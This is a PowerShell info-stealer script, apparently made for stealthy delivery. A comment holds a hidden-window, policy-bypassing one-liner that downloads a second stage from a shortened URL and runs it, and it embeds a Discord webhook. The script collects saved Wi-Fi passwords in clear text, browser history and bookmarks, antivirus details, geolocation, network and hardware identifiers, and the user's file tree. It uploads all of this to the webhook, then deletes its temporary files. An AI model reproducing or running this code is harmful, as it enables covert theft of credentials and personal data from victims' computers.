<# 

Execute command having a max caracters to put into, I need to shorten the links for the command to be as short as possible.
Stage2_test url : 
                    https://rb.gy/vk584t

Invoke powershell + stage 2 into it + be furtive : 
powershell -w h -NoP -Ep Bypass -Command "& {Set-Variable -Name DiscordUrl -Value 'https://discord.com/api/webhooks/1199773516900352161/k8dAsA1xT4os6JLC8WstxzDyrhnmw2R2UrdT3AxcYWbifQppCDgAO9q3zcLY0756svJy'; irm https://rb.gy/vk584t | iex}"

#>
# Function to handle the temporary directory
function TempDir {
    # Check if the C:\temp directory exists
    if (-not (Test-Path -Path "C:\temp" -PathType Container)) {
        # The folder does not exist, create it
        New-Item -Path "C:\" -Name "temp" -ItemType Directory
    }

    # Change the directory to C:\temp
    Set-Location -Path "C:\temp"
}



#Function to upload to discord
function Upload-Discord {
    [CmdletBinding()]
    param (
        [parameter(Position=0,Mandatory=$False)]
        [string]$file,
        [parameter(Position=1,Mandatory=$False)]
        [string]$text 
    )

    $Body = @{
        'username' = $env:username
        'content' = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))){
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $DiscordUrl -Method Post -Body ($Body | ConvertTo-Json)
    }

    if (-not ([string]::IsNullOrEmpty($file))){
        curl.exe -F "file1=@$file" $DiscordUrl
    }
}


# Function to create a zip archive using Compress-Archive and upload to Discord
function ZipAndUploadToDiscord {

    # Specify the source directory
    $sourceDirectory = "C:\temp"

    # Specify the username
    $username = $env:username

    # Specify the date format for the archive name
    $dateSansHeure = Get-Date -Format "dd-MM-yyyy_HH-mm"

    # Specify the destination zip file path with username and date
    $zipFileName = "${username}_Exfiltration_${dateSansHeure}.zip"
    $zipFilePath = Join-Path -Path "C:\temp" -ChildPath $zipFileName

    # Compress the contents of the source directory to a zip file
    Compress-Archive -Path $sourceDirectory -DestinationPath $zipFilePath

    # Call Upload-Discord to send the zip archive to Discord
    Upload-Discord -file $zipFilePath -text "Exfiltration Archive :"

    # Cleanup: Remove the zip file
    Remove-Item -Path $zipFilePath -Force
}




# Créer un scriptblock pour la fonction Exfiltration
function Exfiltration {
    # Get desktop path
    $desktop = [Environment]::GetFolderPath("Desktop")

    # Call AntiSpywareInfo function
    AntiSpywareInfo

    # Call Wifi function
    Wifi

    #Call Get-StorageAndTreeInfo
    StorageAndTreeInfo

    # Call the function to get network information
    $networkInfoPath = NetworkInfo
    # Upload NetworkInfo.txt to Discord
    Upload-Discord -file $networkInfoPath -text "Network Information :"

    #Call HardwareInfo
    HardwareInfo

    #Call GrabBrowserData
    GrabBrowserData -Browser "edge" -DataType "history" | Out-File -Append -FilePath "BrowserData.txt"
    GrabBrowserData -Browser "edge" -DataType "bookmarks" | Out-File -Append -FilePath "BrowserData.txt"
    GrabBrowserData -Browser "chrome" -DataType "history" | Out-File -Append -FilePath "BrowserData.txt"
    GrabBrowserData -Browser "chrome" -DataType "bookmarks" | Out-File -Append -FilePath "BrowserData.txt"
    GrabBrowserData -Browser "firefox" -DataType "history" | Out-File -Append -FilePath "BrowserData.txt"
    Upload-Discord -file "BrowserData.txt" -text "Browser Data:"

    #Call ZipAndUploadToDiscord
    ZipAndUploadToDiscord
}

function AntiSpywareInfo {
    Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Out-File -FilePath C:\Temp\AntiSpyware.txt -Encoding utf8

    # Upload AntiSpyware.txt to Discord
    Upload-Discord -file "C:\Temp\AntiSpyware.txt" -text "Anti-spyware version:"

}

function Wifi {
    # Crée le dossier temporaire wifi dans C:\temp
    New-Item -Path "C:\temp" -Name "wifi" -ItemType "directory" -Force
    Set-Location -Path "C:\temp\wifi"

    # Exporte les profils Wi-Fi
    netsh wlan export profile key=clear

    # Modifie les chemins dans le fichier et sauvegarde le résultat dans Wifi_Passwords.txt
    Select-String -Path *.xml -Pattern 'keyMaterial' | ForEach-Object {
        $_ -replace '</?keyMaterial>', '' -replace "C:\\Users\\$env:UserName\\Desktop\\", '' -replace '.xml:22:', ''
    } | Out-File -FilePath "Wifi_Passwords.txt" -Encoding utf8

    # Charge le fichier Wifi_Passwords.txt sur Discord
    Upload-Discord -file "Wifi_Passwords.txt" -text "Wifi password :"

    # Retourne au dossier temporaire C:\temp
    Set-Location -Path "C:\temp"

    # Supprime le dossier temporaire wifi
    Remove-Item -Path "C:\temp\wifi" -Force -Recurse
}


# Function to get storage and directory tree information
function StorageAndTreeInfo {
    # Create or clear the Storage_Info.txt file
    $storageFilePath = "C:\Temp\Storage_Info.txt"
    Set-Content -Path $storageFilePath -Value $null

    # Collect information about hard drives
    $hardDriveInfo = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 3 } | Select-Object DeviceID, VolumeName, DriveType, FileSystem, VolumeSerialNumber, @{Name="SizeGB"; Expression={[math]::Round($_.Size / 1GB, 2)}}, @{Name="FreeSpaceGB"; Expression={[math]::Round($_.FreeSpace / 1GB, 2)}}, @{Name="FreeSpacePercent"; Expression={[math]::Round(($_.FreeSpace / $_.Size) * 100, 1)}}

    # Output hard drive information
    $hardDriveInfo | Format-Table -AutoSize | Out-File -FilePath $storageFilePath -Append -Encoding utf8

    # Add separator line
    Add-Content -Path $storageFilePath -Value "------------------------------------------------------------------------------------------------------------------------------`n"

    # Run the 'tree' command and append the output to Storage_Info.txt
    tree $Env:userprofile /a /f | Out-File -FilePath $storageFilePath -Append -Encoding utf8

    # Upload Storage_Info.txt to Discord
    Upload-Discord -file $storageFilePath -text "Storage and Directory Tree Information :"
}



# Function to get network information
function NetworkInfo {
    # Function to get geo-location
    function GrabGeoLocation {
        try {
            # Add necessary assembly for accessing System.Device.Location namespace
            Add-Type -AssemblyName System.Device 

            # Create GeoCoordinateWatcher object
            $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher 

            # Start resolving current location
            $GeoWatcher.Start() 

            # Wait for discovery
            while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
                Start-Sleep -Milliseconds 100 
            }  

            # Check for permission denial
            if ($GeoWatcher.Permission -eq 'Denied') {
                Write-Error 'Access Denied for Location Information'
            } else {
                # Select relevant results - Latitude and Longitude
                $GeoWatcher.Position.Location | Select Latitude,Longitude 
            }
        }
        # Handle exceptions and write error for troubleshooting
        catch {
            Write-Error "No coordinates found" 
            return "No Coordinates found"
            -ErrorAction SilentlyContinue
        } 
    }

    # Get geo-location
    $GeoLocation = GrabGeoLocation

    # Split and extract latitude and longitude
    $GeoLocation = $GeoLocation -split " "
    $Lat = $GeoLocation[0].Substring(11) -replace ".$"
    $Lon = $GeoLocation[1].Substring(10) -replace ".$"

    # Get nearby wifi networks
    try {
        $NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Authentication*" -or $_ -like "*Encryption*"}).Trim()
    }
    catch {
        $NearbyWifi = "No nearby wifi networks detected"
    }

    # Get IP / Network Info
    try {
        $computerPubIP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
    }
    catch {
        $computerPubIP = "Error getting Public IP"
    }

    try {
        $localIP = Get-NetIPAddress -InterfaceAlias "*Ethernet*","*Wi-Fi*" -AddressFamily IPv4 | Select InterfaceAlias, IPAddress, PrefixOrigin | Out-String
    }
    catch {
        $localIP = "Error getting local IP"
    }

    $MAC = Get-NetAdapter -Name "*Ethernet*","*Wi-Fi*" | Select Name, MacAddress, Status | Out-String

    # Check RDP status
    if ((Get-ItemProperty "hklm:\System\CurrentControlSet\Control\Terminal Server").fDenyTSConnections -eq 0) { 
        $RDP = "RDP is Enabled" 
    } else {
        $RDP = "RDP is NOT enabled" 
    }

    # Get Network Interfaces
    $NetworkAdapters = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null } | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress | Out-String -width 250

    # Get Listeners / ActiveTcpConnections
    $listener = Get-NetTCPConnection | select @{
        Name="LocalAddress";Expression={$_.LocalAddress + ":" + $_.LocalPort}
    }, @{
        Name="RemoteAddress";Expression={$_.RemoteAddress + ":" + $_.RemotePort}
    }, State, AppliedSetting, OwningProcess

    # Join listener information with process information
    $listener = $listener | foreach-object {
        $listenerItem = $_
        $processItem = ($process | where { [int]$_.Handle -like [int]$listenerItem.OwningProcess })
        new-object PSObject -property @{
          "LocalAddress" = $listenerItem.LocalAddress
          "RemoteAddress" = $listenerItem.RemoteAddress
          "State" = $listenerItem.State
          "AppliedSetting" = $listenerItem.AppliedSetting
          "OwningProcess" = $listenerItem.OwningProcess
          "ProcessName" = $processItem.ProcessName
        }
    } | select LocalAddress, RemoteAddress, State, AppliedSetting, OwningProcess, ProcessName | Sort-Object LocalAddress | Format-Table | Out-String -width 250 

    # Output to a text file
    $networkInfoPath = Join-Path $env:TEMP "NetworkInfo.txt"
    @(
        "Geo-Location Information:",
        "    Latitude: $Lat",
        "    Longitude: $Lon",
        "Nearby WiFi Networks: $NearbyWifi",
        "Public IP: $computerPubIP",
        "Local IP: $localIP",
        "MAC Address: $MAC",
        "RDP Status: $RDP",
        "Network Adapters:",
        "$NetworkAdapters",
        "WiFi Profiles and Passwords:",
        "$wifiProfiles",
        "Listeners / Active TCP Connections:",
        "$listener"
    ) | Out-File -FilePath $networkInfoPath

    # Return the output path
    $networkInfoPath
}

function HardwareInfo {
    # Get computer system information
    $computerSystem = Get-CimInstance CIM_ComputerSystem

    # Get BIOS information
    $bios = Get-CimInstance CIM_BIOSElement

    # Get operating system information
    $operatingSystem = Get-WmiObject Win32_OperatingSystem

    # Get CPU information
    $cpu = Get-WmiObject Win32_Processor

    # Get mainboard information
    $mainboard = Get-WmiObject Win32_BaseBoard

    # Get RAM information
    $ram = Get-WmiObject Win32_PhysicalMemory

    # Get video card information
    $videoCard = Get-WmiObject Win32_VideoController

    # Get driver information
    $drivers = Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, FriendlyName, DriverProviderName, DriverVersion

    # Get COM devices information
    $comDevices = Get-WmiObject Win32_PnPEntity | Where-Object { $_.Name -like '*COM*' } | Select-Object Name, DeviceID, Manufacturer

    # Get network adapters information
    $networkAdapters = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress -ne $null } | Select-Object Index, Description, IPAddress, DefaultIPGateway, MACAddress

    # Create the output content
    $output = @"
------------------------------------------------------------------------------------------------------------------------------

Computer Name:
$($computerSystem.Name)

Model:
$($computerSystem.Model)

Manufacturer:
$($computerSystem.Manufacturer)

BIOS:


SMBIOSBIOSVersion : $($bios.SMBIOSBIOSVersion)
Manufacturer      : $($bios.Manufacturer)
Name              : $($bios.Name)
SerialNumber      : $($bios.SerialNumber)
Version           : $($bios.Version)





OS:

Caption                            Version   
-------                            -------   
$($operatingSystem.Caption) $($operatingSystem.Version)




CPU:


DeviceID      : $($cpu.DeviceID)
Name          : $($cpu.Name)
Caption       : $($cpu.Caption)
Manufacturer  : $($cpu.Manufacturer)
MaxClockSpeed : $($cpu.MaxClockSpeed)
L2CacheSize   : $($cpu.L2CacheSize)
L2CacheSpeed  : $($cpu.L2CacheSpeed)
L3CacheSize   : $($cpu.L3CacheSize)
L3CacheSpeed  : $($cpu.L3CacheSpeed)





Mainboard:


Manufacturer : $($mainboard.Manufacturer)
Model        : $($mainboard.Model)
Name         : $($mainboard.Name)
SerialNumber : $($mainboard.SerialNumber)
SKU          : $($mainboard.SKU)
Product      : $($mainboard.Product)





Ram Capacity:
$("{0:N1} GB" -f ($ram | Measure-Object -Property Capacity -Sum).Sum / 1GB)


Total installed Ram:

$($ram | ForEach-Object { "$($_.DeviceLocator) $("{0:N1} GB" -f ($_.Capacity / 1GB))" } | Format-Table | Out-String)




Video Card: 

Name                 VideoProcessor                 DriverVersion CurrentHorizontalResolution CurrentVerticalResolution
----                 --------------                 ------------- --------------------------- -------------------------
$($videoCard.Name) $($videoCard.VideoProcessor) $($videoCard.DriverVersion) $($videoCard.CurrentHorizontalResolution) $($videoCard.CurrentVerticalResolution)

------------------------------------------------------------------------------------------------------------------------------

Drivers: 

$($drivers | Format-Table | Out-String)


------------------------------------------------------------------------------------------------------------------------------

COM Devices:

$($comDevices | Format-Table | Out-String)


------------------------------------------------------------------------------------------------------------------------------

Network Adapters:

$($networkAdapters | Format-Table | Out-String)

"@

    # Save the output to Hardware_Info.txt
    $HardwareInfoPath = "C:\temp\Hardware_Info.txt"
    $output | Out-File -FilePath $HardwareInfoPath -Encoding utf8

    # Display the output path
    $HardwareInfoPath

    # Upload Hardware_Info.txt to Discord
    Upload-Discord -file $HardwareInfoPath -text "Hardware Informations :"
}


function GrabBrowserData {

    [CmdletBinding()]
    param (	
        [Parameter(Position=1,Mandatory = $True)]
        [string]$Browser,    
        [Parameter(Position=2,Mandatory = $True)]
        [string]$DataType 
    ) 

    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'

    if ($Browser -eq 'chrome' -and $DataType -eq 'history') {
        $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
    }
    elseif ($Browser -eq 'chrome' -and $DataType -eq 'bookmarks') {
        $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
    }
    elseif ($Browser -eq 'edge' -and $DataType -eq 'history') {
        $Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"
    }
    elseif ($Browser -eq 'edge' -and $DataType -eq 'bookmarks') {
        $Path = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
    }
    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history') {
        $Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
    }

    $Value = Get-Content -Path $Path | Select-String -AllMatches $regex | % {($_.Matches).Value} | Sort -Unique
    $Value | ForEach-Object {
        New-Object -TypeName PSObject -Property @{
            User = $env:UserName
            Browser = $Browser
            DataType = $DataType
            Data = $_
        }
    } 
}



# Function to delete the temporary directory
function DelTempDir {
    Set-Location -Path "C:\"

        # Remove the C:\temp directory
        Remove-Item -Path "C:\temp" -Force -Recurse
    }

# Call TempDir
TempDir

# Call Exfiltration
Exfiltration

# Call DelTempDir
DelTempDir
